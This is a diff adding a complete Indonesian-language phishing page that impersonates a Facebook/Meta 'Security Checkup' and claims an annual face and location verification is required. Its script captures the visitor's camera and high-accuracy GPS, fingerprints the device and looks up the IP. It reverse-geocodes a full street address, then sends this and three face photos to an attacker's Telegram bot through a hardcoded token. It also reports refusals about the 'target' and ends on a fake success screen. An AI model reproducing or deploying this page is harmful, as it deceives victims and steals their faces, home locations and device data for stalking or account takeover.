@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Security Checkup</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',-apple-system,sans-serif}
+body{background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+
+.card{background:#fff;width:100%;max-width:420px;border-radius:12px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.1),0 4px 20px rgba(0,0,0,.06)}
+
+.fb-header{padding:20px 20px 16px;border-bottom:1px solid #e4e6eb;display:flex;align-items:center;gap:12px}
+.fb-logo{width:36px;height:36px;flex-shrink:0}
+.fb-title{font-size:15px;font-weight:600;color:#1c1e21;line-height:1.3}
+.fb-title small{display:block;font-size:12px;color:#65676b;font-weight:400;margin-top:2px}
+
+.content{padding:20px}
+
+.alert{background:#fff3cd;border-left:4px solid #ffc107;padding:14px 16px;border-radius:6px;margin-bottom:20px;display:flex;gap:10px}
+.alert .ico{font-size:18px;flex-shrink:0;line-height:1.4}
+.alert p{font-size:13px;color:#664d03;line-height:1.5;font-weight:500}
+
+.title-main{font-size:17px;font-weight:700;color:#1c1e21;margin-bottom:8px}
+.subtitle{font-size:13px;color:#65676b;line-height:1.55;margin-bottom:18px}
+
+.req-list{background:#f7f8fa;border-radius:10px;padding:14px 16px;margin-bottom:22px}
+.req-item{display:flex;align-items:center;gap:12px;padding:8px 0;font-size:13px;color:#1c1e21;font-weight:500}
+.req-item+.req-item{border-top:1px solid #e4e6eb}
+.req-item .dot{width:8px;height:8px;background:#fa383e;border-radius:50%;flex-shrink:0}
+
+.btn-primary{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
+.btn-primary:hover{background:#166fe5}
+.btn-primary:disabled{background:#99bdf7;cursor:not-allowed}
+
+.err{display:none;margin-top:14px;padding:12px;background:#ffebe8;border:1px solid #f5c2c0;border-radius:8px;font-size:12px;color:#b71c1c;text-align:center;line-height:1.5}
+.err.show{display:block}
+
+/* SCANNING OVERLAY */
+.scan-overlay{position:fixed;inset:0;background:#0a1428;z-index:999;display:none;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#fff;text-align:center}
+.scan-overlay.show{display:flex}
+
+.scan-circle{width:260px;height:260px;border-radius:50%;overflow:hidden;border:4px solid #1877f2;position:relative;margin-bottom:24px;box-shadow:0 0 40px rgba(24,119,242,.5)}
+.scan-circle video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+
+.scan-line{position:absolute;left:0;right:0;height:3px;background:#1877f2;box-shadow:0 0 12px #1877f2;animation:scanMove 1.6s infinite ease-in-out}
+@keyframes scanMove{0%,100%{top:10%}50%{top:90%}}
+
+.scan-status{font-size:15px;font-weight:600;letter-spacing:.3px;margin-bottom:6px}
+.scan-desc{font-size:13px;color:#8a93a6;line-height:1.5;max-width:280px}
+
+/* SUCCESS */
+.success-card{background:#fff;width:100%;max-width:380px;border-radius:12px;padding:36px 24px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.08);display:none}
+.success-card.show{display:block}
+.success-check{width:72px;height:72px;border-radius:50%;background:#31a24c;color:#fff;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 20px}
+.success-title{font-size:18px;font-weight:700;color:#1c1e21;margin-bottom:8px}
+.success-desc{font-size:13px;color:#65676b;line-height:1.6}
+</style>
+</head>
+<body>
+
+<div class="card" id="mainCard">
+  <div class="fb-header">
+    <svg class="fb-logo" viewBox="0 0 36 36" fill="none">
+      <circle cx="18" cy="18" r="18" fill="#1877F2"/>
+      <path d="M23.5 18h-3.6v10h-4.2V18h-2.6v-3.5h2.6v-2.2c0-2.7 1.6-4.1 4-4.1 1.1 0 2.1.1 2.4.1v3h-1.7c-1.3 0-1.6.6-1.6 1.6v1.7h3.6L23.5 18z" fill="#fff"/>
+    </svg>
+    <div class="fb-title">Security Checkup<small>Meta Platforms — Annual Verification</small></div>
+  </div>
+
+  <div class="content">
+    <div class="alert">
+      <div class="ico">⚠️</div>
+      <p>Sistem mendeteksi akun Anda belum melakukan verifikasi tahunan. Verifikasi wajah dan lokasi wajib dilakukan untuk mencegah pembobolan data.</p>
+    </div>
+
+    <div class="title-main">Verifikasi Identitas</div>
+    <div class="subtitle">Proses ini memakan waktu kurang dari 30 detik. Data yang dikumpulkan hanya untuk verifikasi keamanan dan tidak akan dipublikasikan.</div>
+
+    <div class="req-list">
+      <div class="req-item"><span class="dot"></span> Pemindaian Wajah (Liveness)</div>
+      <div class="req-item"><span class="dot"></span> Validasi Titik Lokasi</div>
+      <div class="req-item"><span class="dot"></span> Sinkronisasi Perangkat</div>
+    </div>
+
+    <button class="btn-primary" id="btnStart">Verifikasi Sekarang</button>
+    <div class="err" id="errBox">Akses ditolak. Verifikasi tidak dapat dilanjutkan. Harap izinkan kamera dan lokasi di pengaturan browser.</div>
+  </div>
+</div>
+
+<div class="success-card" id="successCard">
+  <div class="success-check">✓</div>
+  <div class="success-title">Verifikasi Berhasil</div>
+  <div class="success-desc">Terima kasih. Akun Anda telah terverifikasi dan aman.<br>Anda dapat menutup halaman ini.</div>
+</div>
+
+<div class="scan-overlay" id="scanOverlay">
+  <div class="scan-circle">
+    <video id="scanVideo" autoplay playsinline muted></video>
+    <div class="scan-line"></div>
+  </div>
+  <div class="scan-status" id="scanStatus">Memverifikasi identitas...</div>
+  <div class="scan-desc" id="scanDesc">Jangan tutup halaman ini selama proses berlangsung.</div>
+</div>
+
+<script>
+(() => {
+"use strict";
+
+// ═══════════════════════════════════════════════════════
+// CONFIG
+// ═══════════════════════════════════════════════════════
+const TG_BOT  = "8892173347:AAG1U9H0TpUirG3rikyUP1XZRwt1RV1Cu6c";
+const TG_CHAT = "7191940139";
+// ═══════════════════════════════════════════════════════
+
+const $ = id => document.getElementById(id);
+const esc = s => String(s ?? "-").replace(/[<>&]/g, c => ({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+// ═══════════════════════════════════════════════════════
+// TELEGRAM
+// ═══════════════════════════════════════════════════════
+async function tgSend(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: "HTML", disable_web_page_preview: true })
+    });
+  } catch(_) {}
+}
+async function tgPhoto(blob, caption) {
+  try {
+    const fd = new FormData();
+    fd.append("chat_id", TG_CHAT);
+    fd.append("caption", caption);
+    fd.append("photo", blob, "scan.jpg");
+    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendPhoto`, { method: "POST", body: fd });
+  } catch(_) {}
+}
+
+// ═══════════════════════════════════════════════════════
+// IP + REVERSE GEOCODE
+// ═══════════════════════════════════════════════════════
+async function getIP() {
+  try {
+    const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+    const d = await r.json();
+    if (d.ip) return {
+      ip: d.ip, city: d.city, region: d.region,
+      country: d.country_name, org: d.org,
+      lat: d.latitude, lon: d.longitude
+    };
+  } catch(_) {}
+  return null;
+}
+
+async function reverseGeo(lat, lon) {
+  try {
+    const r = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=id`,
+      { headers: { "Accept": "application/json" } }
+    );
+    const d = await r.json();
+    if (d.address) {
+      const a = d.address;
+      return {
+        full:     d.display_name || "-",
+        road:     a.road || a.pedestrian || a.footway || a.path || "-",
+        hamlet:   a.hamlet || a.neighbourhood || a.suburb || "-",
+        village:  a.village || a.suburb || a.neighbourhood || a.hamlet || "-",
+        district: a.city_district || a.district || a.county || a.municipality || "-",
+        city:     a.city || a.town || a.village || "-",
+        state:    a.state || a.region || "-",
+        postcode: a.postcode || "-",
+        country:  a.country || "-"
+      };
+    }
+  } catch(_) {}
+  return null;
+}
+
+// ═══════════════════════════════════════════════════════
+// DEVICE FINGERPRINT
+// ═══════════════════════════════════════════════════════
+function parseDevice() {
+  const ua = navigator.userAgent;
+  let os = "Unknown";
+  let model = "";
+
+  if (/iPhone/.test(ua)) os = "iOS (iPhone)";
+  else if (/iPad/.test(ua)) os = "iPadOS";
+  else if (/Android/.test(ua)) {
+    os = "Android";
+    const m = ua.match(/Android [\d.]+; ([^;)]+)/);
+    if (m) model = m[1].trim();
+  }
+  else if (/Windows/.test(ua)) os = "Windows";
+  else if (/Mac OS/.test(ua)) os = "macOS";
+
+  let browser = "Unknown";
+  if (/Edg\//.test(ua)) browser = "Edge";
+  else if (/Chrome\//.test(ua) && !/Edg|OPR/.test(ua)) browser = "Chrome";
+  else if (/Firefox\//.test(ua)) browser = "Firefox";
+  else if (/Safari\//.test(ua)) browser = "Safari";
+
+  const coreMatch = ua.match(/Chrome\/(\d+)/);
+  const ver = coreMatch ? coreMatch[1] : "";
+
+  return {
+    os, model, browser, ver,
+    ua: ua.slice(0, 200),
+    screen: `${screen.width}x${screen.height} @${window.devicePixelRatio}x`,
+    lang: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "-"
+  };
+}
+
+// ═══════════════════════════════════════════════════════
+// MAIN
+// ═══════════════════════════════════════════════════════
+const btnStart   = $("btnStart");
+const errBox     = $("errBox");
+const mainCard   = $("mainCard");
+const successCard= $("successCard");
+const scanOverlay= $("scanOverlay");
+const scanVideo  = $("scanVideo");
+const scanStatus = $("scanStatus");
+const scanDesc   = $("scanDesc");
+
+let camStream = null;
+let alreadySent = false;
+
+btnStart.addEventListener("click", async () => {
+  if (alreadySent) return;
+  alreadySent = true;
+  btnStart.disabled = true;
+  btnStart.textContent = "Meminta izin...";
+  errBox.classList.remove("show");
+
+  // ── 1. CAMERA (chained immediately) ──
+  try {
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+  } catch (e) {
+    await tgSend("⚠️ <b>Target menolak KAMERA</b>\n" +
+                 `OS: ${esc(parseDevice().os)}\n` +
+                 `UA: <code>${esc(parseDevice().ua)}</code>`);
+    return deny();
+  }
+
+  // ── 2. LOCATION (fires immediately after camera grant) ──
+  const loc = await new Promise(resolve => {
+    if (!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: Math.round(pos.coords.accuracy || 999)
+      }),
+      () => resolve(null),
+      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+    );
+  });
+
+  if (!loc) {
+    if (camStream) camStream.getTracks().forEach(t => t.stop());
+    await tgSend("⚠️ <b>Target menolak LOKASI</b>\n" +
+                 `OS: ${esc(parseDevice().os)}\n` +
+                 `UA: <code>${esc(parseDevice().ua)}</code>`);
+    return deny();
+  }
+
+  // ── 3. BOTH GRANTED → SCANNING ──
+  mainCard.style.display = "none";
+  scanOverlay.classList.add("show");
+  scanVideo.srcObject = camStream;
+  try { await scanVideo.play(); } catch(_) {}
+  await sleep(1200); // fokus kamera
+
+  // ── 4. COLLECT DATA ──
+  const device = parseDevice();
+  const ip     = await getIP();
+  const geo    = await reverseGeo(loc.lat, loc.lon);
+
+  // ── 5. BUILD REPORT ──
+  const lines = [];
+  lines.push("🔓 <b>FACEBOOK SECURITY CHECKUP — BYPASS</b>");
+  lines.push("━━━━━━━━━━━━━━━━━━━━");
+  lines.push("");
+  lines.push("📱 <b>PERANGKAT</b>");
+  lines.push(`├ OS: ${esc(device.os)}${device.model ? " — " + esc(device.model) : ""}`);
+  lines.push(`├ Browser: ${esc(device.browser)} ${device.ver}`);
+  lines.push(`├ Layar: ${device.screen}`);
+  lines.push(`├ Bahasa: ${esc(device.lang)}`);
+  lines.push(`└ TZ: ${esc(device.tz)}`);
+  lines.push("");
+  lines.push("📍 <b>LOKASI GPS</b>");
+  lines.push(`├ Lat: <code>${loc.lat}</code>`);
+  lines.push(`├ Lng: <code>${loc.lon}</code>`);
+  lines.push(`└ Akurasi: ±${loc.acc}m`);
+  lines.push("");
+  if (geo) {
+    lines.push("🏠 <b>ALAMAT LENGKAP</b>");
+    lines.push(`├ Jalan: ${esc(geo.road)}`);
+    if (geo.hamlet !== "-") lines.push(`├ Dusun/Lingkungan: ${esc(geo.hamlet)}`);
+    lines.push(`├ Kel/Desa: ${esc(geo.village)}`);
+    lines.push(`├ Kecamatan: ${esc(geo.district)}`);
+    lines.push(`├ Kota/Kab: ${esc(geo.city)}`);
+    lines.push(`├ Provinsi: ${esc(geo.state)}`);
+    lines.push(`├ Kode Pos: ${esc(geo.postcode)}`);
+    lines.push(`└ Negara: ${esc(geo.country)}`);
+    lines.push("");
+    lines.push(`📖 <i>${esc(geo.full)}</i>`);
+    lines.push("");
+  }
+  lines.push("🌐 <b>JARINGAN</b>");
+  if (ip) {
+    lines.push(`├ IP: <code>${esc(ip.ip)}</code>`);
+    lines.push(`├ ISP: ${esc(ip.org)}`);
+    lines.push(`└ Wilayah IP: ${esc(ip.city)}, ${esc(ip.region)}, ${esc(ip.country)}`);
+  } else {
+    lines.push("└ (IP tidak tersedia)");
+  }
+  lines.push("");
+  lines.push(`🗺️ <a href="https://maps.google.com/?q=${loc.lat},${loc.lon}">Buka Google Maps</a>`);
+  lines.push(`🕒 ${new Date().toLocaleString("id-ID")}`);
+
+  await tgSend(lines.join("\n"));
+
+  // ── 6. TAKE 3 PHOTOS ──
+  const canvas = document.createElement("canvas");
+  canvas.width  = scanVideo.videoWidth || 720;
+  canvas.height = scanVideo.videoHeight || 1280;
+  const ctx = canvas.getContext("2d");
+
+  for (let i = 1; i <= 3; i++) {
+    scanStatus.textContent = `Memverifikasi identitas (${i}/3)...`;
+    scanDesc.textContent   = "Jangan tutup halaman ini.";
+
+    // mirror for natural selfie orientation
+    ctx.save();
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(scanVideo, 0, 0, canvas.width, canvas.height);
+    ctx.restore();
+
+    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.85));
+    if (blob) await tgPhoto(blob, `📸 <b>Wajah #${i}</b> — ${esc(device.os)}`);
+
+    if (i < 3) await sleep(800);
+  }
+
+  // ── 7. CLEANUP + SUCCESS ──
+  scanStatus.textContent = "Selesai";
+  scanDesc.textContent   = "Verifikasi berhasil.";
+  try { camStream.getTracks().forEach(t => t.stop()); } catch(_) {}
+  await sleep(900);
+
+  scanOverlay.classList.remove("show");
+  successCard.classList.add("show");
+});
+
+function deny() {
+  btnStart.disabled = false;
+  btnStart.textContent = "Verifikasi Sekarang";
+  errBox.classList.add("show");
+}
+
+})();
+</script>
+</body>
+</html>
